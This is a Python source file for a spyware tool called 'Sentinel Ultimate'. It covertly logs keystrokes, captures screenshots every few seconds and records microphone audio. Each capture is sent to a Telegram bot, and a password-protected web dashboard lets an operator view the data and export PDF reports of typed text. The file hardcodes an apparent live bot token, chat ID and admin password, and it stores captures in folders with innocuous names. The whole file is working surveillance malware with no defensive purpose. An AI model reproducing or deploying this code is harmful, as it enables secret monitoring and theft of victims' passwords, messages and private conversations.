#!/usr/bin/env python
# -*- coding: utf-8 -*-
"""
SENTINEL ULTIMATE - VERSÃO PARA RENDER (CORRIGIDA)
"""

import os
import sys
import threading
import time
import requests
import pyautogui
import sounddevice as sd
import soundfile as sf
from pynput import keyboard
from datetime import datetime
import numpy as np
import webbrowser
from http.server import HTTPServer, BaseHTTPRequestHandler  # <-- IMPORTAÇÃO CORRETA
import json
import urllib.parse
from io import BytesIO

# ============================================
# CONFIGURAÇÕES
# ============================================

# ⚠️ IMPORTANTE: Use variáveis de ambiente no Render!
BOT_TOKEN = os.environ.get('TELEGRAM_BOT_TOKEN', '8714368220:AAEOvQQlzPlXkEFGPYSdKzm2N2kD-owOam0')
CHAT_ID = os.environ.get('TELEGRAM_CHAT_ID', '5672315001')

USUARIO = "admin"
SENHA = "SpyWatdon3609"

# Pastas
DATA_DIR = "SystemData"
LOG_DIR = os.path.join(DATA_DIR, "Logs")
SCREENSHOT_DIR = os.path.join(DATA_DIR, "Cache")
AUDIO_DIR = os.path.join(DATA_DIR, "Temp")
KEYLOG_PATH = os.path.join(LOG_DIR, "syslog.txt")

for pasta in [DATA_DIR, LOG_DIR, SCREENSHOT_DIR, AUDIO_DIR]:
    os.makedirs(pasta, exist_ok=True)

# Variáveis
monitor_ativo = True
tempo_screenshot = 5
tempo_audio = 10
ultima_screenshot = None
ultimo_audio = None
ultimas_frases = []
buffer_teclas = ""
ultimo_tempo = time.time()
logado = False

estatisticas = {
    'screenshots': 0,
    'audios': 0,
    'teclas': 0,
    'palavras': 0,
    'start_time': time.time()
}

# ============================================
# FUNÇÕES TELEGRAM
# ============================================

def enviar_mensagem_telegram(texto):
    try:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
        requests.post(url, data={"chat_id": CHAT_ID, "text": texto}, timeout=5)
        return True
    except:
        return False

def enviar_arquivo_telegram(caminho, legenda):
    try:
        with open(caminho, "rb") as f:
            url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"
            requests.post(url, data={"chat_id": CHAT_ID, "caption": legenda}, files={"document": f}, timeout=10)
            return True
    except:
        return False

def testar_telegram():
    print("📡 Testando Telegram...")
    if enviar_mensagem_telegram("🛡️ SENTINEL ULTIMATE INICIADO!"):
        print("✅ Telegram CONECTADO!")
    else:
        print("⚠️ Telegram NÃO CONECTADO!")

# ============================================
# KEYLOGGER
# ============================================

def processar_tecla(tecla):
    global buffer_teclas, ultimas_frases, estatisticas, ultimo_tempo, monitor_ativo
    if not monitor_ativo:
        return
    try:
        if hasattr(tecla, 'char') and tecla.char:
            caractere = tecla.char
            if caractere.isalnum() or caractere in [' ', '.', ',', '!', '?']:
                buffer_teclas += caractere
                ultimo_tempo = time.time()
            elif caractere == '\r' or caractere == '\n':
                if buffer_teclas.strip():
                    registrar_frase(buffer_teclas.strip())
                buffer_teclas = ""
        else:
            tecla_nome = str(tecla).replace('Key.', '')
            if tecla_nome == 'space':
                buffer_teclas += ' '
                ultimo_tempo = time.time()
            elif tecla_nome == 'enter':
                if buffer_teclas.strip():
                    registrar_frase(buffer_teclas.strip())
                buffer_teclas = ""
        
        if time.time() - ultimo_tempo > 2 and buffer_teclas.strip():
            registrar_frase(buffer_teclas.strip())
            buffer_teclas = ""
    except:
        pass

def registrar_frase(frase):
    global ultimas_frases, estatisticas
    if not frase.strip():
        return
    registro = f"[{datetime.now().strftime('%H:%M:%S')}] {frase}"
    with open(KEYLOG_PATH, "a", encoding="utf-8") as f:
        f.write(registro + "\n")
    ultimas_frases.append(registro)
    if len(ultimas_frases) > 100:
        ultimas_frases.pop(0)
    estatisticas['teclas'] += len(frase)
    estatisticas['palavras'] += 1
    enviar_mensagem_telegram(f"⌨️ {frase}")

def iniciar_keylogger():
    with keyboard.Listener(on_press=processar_tecla) as listener:
        listener.join()

# ============================================
# CAPTURAS
# ============================================

def capturar_screenshot():
    global ultima_screenshot, estatisticas, monitor_ativo
    if not monitor_ativo:
        return None
    try:
        nome = f"scr_{int(time.time())}.png"
        caminho = os.path.join(SCREENSHOT_DIR, nome)
        pyautogui.screenshot(caminho)
        ultima_screenshot = caminho
        estatisticas['screenshots'] += 1
        enviar_arquivo_telegram(caminho, "📸")
        return caminho
    except:
        return None

def capturar_audio():
    global ultimo_audio, estatisticas, monitor_ativo
    if not monitor_ativo:
        return None
    try:
        nome = f"aud_{int(time.time())}.wav"
        caminho = os.path.join(AUDIO_DIR, nome)
        fs = 44100
        duracao = 5
        gravacao = sd.rec(int(duracao * fs), samplerate=fs, channels=2, dtype='float32')
        sd.wait()
        gravacao = np.clip(gravacao * 5.0, -1.0, 1.0)
        sf.write(caminho, gravacao, fs)
        ultimo_audio = caminho
        estatisticas['audios'] += 1
        enviar_arquivo_telegram(caminho, "🎤")
        return caminho
    except:
        return None

def loop_captura():
    global monitor_ativo, tempo_screenshot
    while True:
        if monitor_ativo:
            capturar_screenshot()
        time.sleep(tempo_screenshot)

def loop_audio():
    global monitor_ativo, tempo_audio
    while True:
        if monitor_ativo:
            capturar_audio()
        time.sleep(tempo_audio)

# ============================================
# SERVIDOR WEB
# ============================================

class Handler(BaseHTTPRequestHandler):
    
    def log_message(self, format, *args):
        pass
    
    def do_GET(self):
        global logado, ultima_screenshot, ultimo_audio, estatisticas, monitor_ativo
        
        if self.path.startswith('/screenshot'):
            if ultima_screenshot and os.path.exists(ultima_screenshot):
                with open(ultima_screenshot, 'rb') as f:
                    self.send_response(200)
                    self.send_header('Content-type', 'image/png')
                    self.send_header('Cache-Control', 'no-cache')
                    self.end_headers()
                    self.wfile.write(f.read())
                return
            self.send_response(404)
            self.end_headers()
            return
        
        elif self.path.startswith('/audio'):
            if ultimo_audio and os.path.exists(ultimo_audio):
                with open(ultimo_audio, 'rb') as f:
                    self.send_response(200)
                    self.send_header('Content-type', 'audio/wav')
                    self.end_headers()
                    self.wfile.write(f.read())
                return
            self.send_response(404)
            self.end_headers()
            return
        
        elif self.path == '/keylog':
            self.send_response(200)
            self.send_header('Content-type', 'application/json')
            self.end_headers()
            if os.path.exists(KEYLOG_PATH):
                with open(KEYLOG_PATH, 'r') as f:
                    linhas = f.readlines()[-50:]
                self.wfile.write(json.dumps({'teclas': linhas}).encode())
            else:
                self.wfile.write(json.dumps({'teclas': []}).encode())
            return
        
        elif self.path == '/stats':
            self.send_response(200)
            self.send_header('Content-type', 'application/json')
            self.end_headers()
            self.wfile.write(json.dumps({
                'screenshots': estatisticas['screenshots'],
                'audios': estatisticas['audios'],
                'teclas': estatisticas['teclas'],
                'palavras': estatisticas['palavras'],
                'monitorando': monitor_ativo
            }).encode())
            return
        
        elif self.path == '/export_pdf':
            from reportlab.lib.pagesizes import A4
            from reportlab.pdfgen import canvas
            from reportlab.lib.utils import ImageReader
            from reportlab.lib.colors import Color
            
            buffer = BytesIO()
            pdf = canvas.Canvas(buffer, pagesize=A4)
            width, height = A4
            
            pdf.setFont("Helvetica-Bold", 24)
            pdf.setFillColor(Color(0, 0.8, 0.8))
            pdf.drawString(50, height - 50, "SENTINEL ULTIMATE")
            
            pdf.setFont("Helvetica", 10)
            pdf.setFillColor(Color(0.5, 0.5, 0.5))
            pdf.drawString(50, height - 80, f"Relatório: {datetime.now().strftime('%d/%m/%Y %H:%M:%S')}")
            
            pdf.line(50, height - 90, width - 50, height - 90)
            
            pdf.setFont("Helvetica-Bold", 16)
            pdf.setFillColor(Color(0, 0.8, 0.8))
            pdf.drawString(50, height - 130, "📊 ESTATÍSTICAS")
            
            pdf.setFont("Helvetica", 12)
            pdf.setFillColor((1, 1, 1))
            pdf.drawString(50, height - 160, f"📸 Screenshots: {estatisticas['screenshots']}")
            pdf.drawString(50, height - 180, f"🎤 Áudios: {estatisticas['audios']}")
            pdf.drawString(50, height - 200, f"⌨️ Caracteres: {estatisticas['teclas']}")
            pdf.drawString(50, height - 220, f"📝 Palavras: {estatisticas['palavras']}")
            
            uptime = int(time.time() - estatisticas['start_time'])
            horas = uptime // 3600
            minutos = (uptime % 3600) // 60
            segundos = uptime % 60
            pdf.drawString(50, height - 240, f"⏱️ Tempo: {horas}h {minutos}m {segundos}s")
            
            pdf.line(50, height - 260, width - 50, height - 260)
            
            pdf.setFont("Helvetica-Bold", 16)
            pdf.setFillColor(Color(0, 0.8, 0.8))
            pdf.drawString(50, height - 300, "⌨️ PALAVRAS DIGITADAS")
            
            pdf.setFont("Helvetica", 9)
            pdf.setFillColor((1, 1, 1))
            y = height - 330
            if os.path.exists(KEYLOG_PATH):
                with open(KEYLOG_PATH, 'r', encoding='utf-8') as f:
                    linhas = f.readlines()[-50:]
                    for linha in reversed(linhas):
                        if y < 50:
                            pdf.showPage()
                            y = height - 50
                        linha_limpa = linha.strip()[:90]
                        if linha_limpa:
                            pdf.drawString(50, y, linha_limpa)
                            y -= 14
            
            pdf.save()
            buffer.seek(0)
            
            self.send_response(200)
            self.send_header('Content-type', 'application/pdf')
            self.send_header('Content-Disposition', f'attachment; filename=relatorio_sentinel_{datetime.now().strftime("%Y%m%d_%H%M%S")}.pdf')
            self.end_headers()
            self.wfile.write(buffer.getvalue())
            return
        
        elif self.path == '/logout':
            logado = False
            self.send_response(302)
            self.send_header('Location', '/')
            self.end_headers()
            return
        
        elif self.path == '/':
            self.send_response(200)
            self.send_header('Content-type', 'text/html; charset=utf-8')
            self.end_headers()
            html = LOGIN_HTML if not logado else DASHBOARD_HTML
            self.wfile.write(html.encode('utf-8'))
            return
        
        else:
            self.send_response(404)
            self.end_headers()
    
    def do_POST(self):
        global logado, estatisticas, ultimas_frases, buffer_teclas, monitor_ativo
        
        if self.path == '/login':
            length = int(self.headers['Content-Length'])
            data = self.rfile.read(length).decode()
            params = urllib.parse.parse_qs(data)
            if params.get('usuario', [''])[0] == USUARIO and params.get('senha', [''])[0] == SENHA:
                logado = True
                self.send_response(200)
                self.send_header('Content-type', 'application/json')
                self.end_headers()
                self.wfile.write(json.dumps({'success': True}).encode())
            else:
                self.send_response(200)
                self.send_header('Content-type', 'application/json')
                self.end_headers()
                self.wfile.write(json.dumps({'success': False}).encode())
        
        elif self.path == '/start':
            monitor_ativo = True
            estatisticas['start_time'] = time.time()
            enviar_mensagem_telegram("▶️ Monitoramento INICIADO!")
            self.send_response(200)
            self.end_headers()
            self.wfile.write(b'OK')
        
        elif self.path == '/stop':
            monitor_ativo = False
            enviar_mensagem_telegram("⏸️ Monitoramento PAUSADO!")
            self.send_response(200)
            self.end_headers()
            self.wfile.write(b'OK')
        
        elif self.path == '/capturar':
            threading.Thread(target=capturar_screenshot).start()
            self.send_response(200)
            self.end_headers()
            self.wfile.write(b'OK')
        
        elif self.path == '/audio_cmd':
            threading.Thread(target=capturar_audio).start()
            self.send_response(200)
            self.end_headers()
            self.wfile.write(b'OK')
        
        elif self.path == '/clear_teclas':
            ultimas_frases = []
            estatisticas['teclas'] = 0
            estatisticas['palavras'] = 0
            buffer_teclas = ""
            if os.path.exists(KEYLOG_PATH):
                open(KEYLOG_PATH, 'w').close()
            self.send_response(200)
            self.end_headers()
            self.wfile.write(b'OK')
        
        elif self.path == '/clear_all':
            ultimas_frases = []
            estatisticas['screenshots'] = 0
            estatisticas['audios'] = 0
            estatisticas['teclas'] = 0
            estatisticas['palavras'] = 0
            estatisticas['start_time'] = time.time()
            buffer_teclas = ""
            for folder in [SCREENSHOT_DIR, AUDIO_DIR]:
                for f in os.listdir(folder):
                    try:
                        os.remove(os.path.join(folder, f))
                    except:
                        pass
            if os.path.exists(KEYLOG_PATH):
                open(KEYLOG_PATH, 'w').close()
            self.send_response(200)
            self.end_headers()
            self.wfile.write(b'OK')
        
        else:
            self.send_response(404)
            self.end_headers()

# ============================================
# HTML (mesmo código, mantido)
# ============================================

LOGIN_HTML = '''<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Sentinel - Login</title>
    <style>
        body{background:linear-gradient(135deg,#0a0a2a,#1a1a3a);font-family:Arial;display:flex;justify-content:center;align-items:center;height:100vh}
        .card{background:rgba(255,255,255,0.1);backdrop-filter:blur(10px);border-radius:30px;padding:40px;width:380px;text-align:center}
        h1{color:#00ffcc}
        input{width:100%;padding:14px;margin:10px 0;background:rgba(0,0,0,0.5);border:1px solid #00ffcc;border-radius:15px;color:white}
        button{width:100%;padding:14px;background:linear-gradient(45deg,#00ffcc,#00ccff);border:none;border-radius:15px;font-weight:bold;cursor:pointer}
    </style>
</head>
<body>
<div class="card">
    <h1>🛡️ Sentinel Ultimate</h1>
    <input type="text" id="usuario" placeholder="Usuário" value="admin">
    <input type="password" id="senha" placeholder="Senha">
    <button onclick="login()">🔓 ACESSAR</button>
    <div id="error" style="color:red;margin-top:15px;display:none"></div>
</div>
<script>
async function login(){
    const res=await fetch('/login',{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:`usuario=${document.getElementById('usuario').value}&senha=${document.getElementById('senha').value}`});
    const data=await res.json();
    if(data.success)location.href='/';
    else document.getElementById('error').style.display='block';
}
</script>
</body>
</html>'''

DASHBOARD_HTML = '''<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Sentinel - Dashboard</title>
    <style>
        *{margin:0;padding:0;box-sizing:border-box}
        body{background:linear-gradient(135deg,#0f0c29,#302b63,#24243e);color:#fff;font-family:Arial;padding:20px}
        .navbar{background:rgba(0,0,0,0.8);padding:15px;border-radius:15px;display:flex;justify-content:space-between;align-items:center;margin-bottom:20px;flex-wrap:wrap;gap:10px}
        .logo{font-size:24px;font-weight:bold;color:#00ffcc}
        .status{display:flex;align-items:center;gap:10px}
        .led{width:12px;height:12px;background:#0f0;border-radius:50%;animation:pulse 1s infinite}
        @keyframes pulse{0%,100%{opacity:0.5}50%{opacity:1}}
        .btn{background:#00ffcc;border:none;padding:8px 18px;border-radius:25px;cursor:pointer;margin:3px;font-weight:bold}
        .btn-stop{background:#ff4444;color:white}
        .btn-start{background:#00cc66;color:white}
        .btn-pdf{background:#ff4444;color:white}
        .btn-clear{background:#ffaa44;color:#333}
        .horizontal-grid{display:flex;gap:25px;margin-bottom:25px;flex-wrap:wrap}
        .card{background:rgba(255,255,255,0.1);border-radius:20px;padding:20px;flex:1;min-width:300px}
        .card-header{border-bottom:2px solid #00ffcc;margin-bottom:15px;padding-bottom:10px}
        img{width:100%;border-radius:10px;max-height:200px;object-fit:contain;background:#000}
        audio{width:100%}
        .stats{display:flex;gap:15px;flex-wrap:wrap}
        .stat-box{text-align:center;background:rgba(0,0,0,0.4);padding:15px;border-radius:15px;flex:1}
        .stat-number{font-size:28px;font-weight:bold;color:#00ffcc}
        .keylog-area{background:rgba(0,0,0,0.5);border-radius:10px;padding:15px;height:300px;overflow-y:auto;font-family:monospace}
        .keylog-line{padding:5px;border-bottom:1px solid rgba(255,255,255,0.1)}
    </style>
</head>
<body>
<div class="navbar">
    <div class="logo">🛡️ Sentinel Ultimate</div>
    <div class="status"><div class="led"></div><span id="statusText">Monitorando</span><span id="clock"></span></div>
    <div>
        <button class="btn-start btn" onclick="iniciar()">▶️ Iniciar</button>
        <button class="btn-stop btn" onclick="parar()">⏸️ Parar</button>
        <button class="btn" onclick="capturar()">📸</button>
        <button class="btn" onclick="audio()">🎤</button>
        <button class="btn-pdf btn" onclick="exportarPDF()">📄 PDF</button>
        <button class="btn-clear btn" onclick="limparTudo()">🗑️</button>
        <button class="btn" onclick="sair()">🚪</button>
    </div>
</div>
<div class="horizontal-grid">
    <div class="card"><div class="card-header">📸 Screenshot</div><img id="scr" onclick="abrirModal()"><div id="scr_time"></div></div>
    <div class="card"><div class="card-header">🎤 Áudio</div><audio id="aud" controls></audio><div id="aud_time"></div></div>
    <div class="card"><div class="card-header">📊 Estatísticas</div>
    <div class="stats">
        <div class="stat-box"><div class="stat-number" id="s1">0</div>Screens</div>
        <div class="stat-box"><div class="stat-number" id="s2">0</div>Áudios</div>
        <div class="stat-box"><div class="stat-number" id="s3">0</div>Caracteres</div>
        <div class="stat-box"><div class="stat-number" id="s4">0</div>Palavras</div>
        <div class="stat-box"><div class="stat-number" id="uptime">00:00:00</div>Tempo</div>
    </div>
    <hr><button class="btn-clear btn" onclick="limparTeclas()">⌨️ Limpar Teclas</button>
    </div>
</div>
<div class="card"><div class="card-header">⌨️ PALAVRAS DIGITADAS</div><div class="keylog-area" id="keylog"></div></div>
<div id="modal" style="display:none;position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.9);justify-content:center;align-items:center" onclick="fecharModal()"><span style="position:absolute;top:20px;right:40px;font-size:40px;cursor:pointer">&times;</span><img id="modal-img"></div>
<script>
let startTime=Date.now();
function atualizar(){
    document.getElementById('scr').src='/screenshot?_='+Date.now();
    document.getElementById('scr_time').innerHTML='📸 '+new Date().toLocaleTimeString();
    let a=document.getElementById('aud');a.src='/audio?_='+Date.now();a.load();
    document.getElementById('aud_time').innerHTML='🎤 '+new Date().toLocaleTimeString();
    fetch('/keylog').then(r=>r.json()).then(d=>{let div=document.getElementById('keylog');if(d.teclas&&d.teclas.length)div.innerHTML=d.teclas.map(l=>`<div class="keylog-line">💬 ${escapeHtml(l)}</div>`).join('');else div.innerHTML='<div class="keylog-line">Nenhuma palavra...</div>'});
    fetch('/stats').then(r=>r.json()).then(d=>{document.getElementById('s1').innerText=d.screenshots;document.getElementById('s2').innerText=d.audios;document.getElementById('s3').innerText=d.teclas;document.getElementById('s4').innerText=d.palavras;document.getElementById('statusText').innerHTML=d.monitorando?"🟢 Monitorando":"🔴 Parado"});
    let u=Math.floor((Date.now()-startTime)/1000);document.getElementById('uptime').innerText=`${Math.floor(u/3600).toString().padStart(2,'0')}:${Math.floor((u%3600)/60).toString().padStart(2,'0')}:${(u%60).toString().padStart(2,'0')}`;
    document.getElementById('clock').innerHTML=new Date().toLocaleTimeString();
}
function escapeHtml(t){let d=document.createElement('div');d.textContent=t;return d.innerHTML}
function iniciar(){fetch('/start',{method:'POST'}).then(()=>{startTime=Date.now();atualizar()})}
function parar(){fetch('/stop',{method:'POST'}).then(()=>atualizar())}
function capturar(){fetch('/capturar',{method:'POST'})}
function audio(){fetch('/audio_cmd',{method:'POST'})}
function exportarPDF(){window.open('/export_pdf')}
function sair(){window.location.href='/logout'}
function limparTeclas(){if(confirm('Limpar teclas?'))fetch('/clear_teclas',{method:'POST'}).then(()=>atualizar())}
function limparTudo(){if(confirm('⚠️ LIMPAR TUDO?'))fetch('/clear_all',{method:'POST'}).then(()=>{startTime=Date.now();atualizar()})}
function abrirModal(){let i=document.getElementById('scr').src;if(i){document.getElementById('modal-img').src=i;document.getElementById('modal').style.display='flex'}}
function fecharModal(){document.getElementById('modal').style.display='none'}
setInterval(atualizar,3000);atualizar();
</script>
</body>
</html>'''

# ============================================
# MAIN
# ============================================

if __name__ == "__main__":
    port = int(os.environ.get('PORT', 8080))
    
    print("\n" + "=" * 60)
    print("🛡️ SENTINEL ULTIMATE - DEPLOY RENDER")
    print("=" * 60)
    print(f"📱 ACESSE: http://0.0.0.0:{port}")
    print("🔐 LOGIN: admin")
    print("🔐 SENHA: SpyWatdon3609")
    print("=" * 60)
    
    testar_telegram()
    
    threading.Thread(target=iniciar_keylogger, daemon=True).start()
    threading.Thread(target=loop_captura, daemon=True).start()
    threading.Thread(target=loop_audio, daemon=True).start()
    
    server = HTTPServer(('0.0.0.0', port), Handler)
    print(f"✅ SERVIDOR RODANDO na porta {port}")
    print("=" * 60)
    
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        print("\n👋 Encerrando...")
        server.shutdown()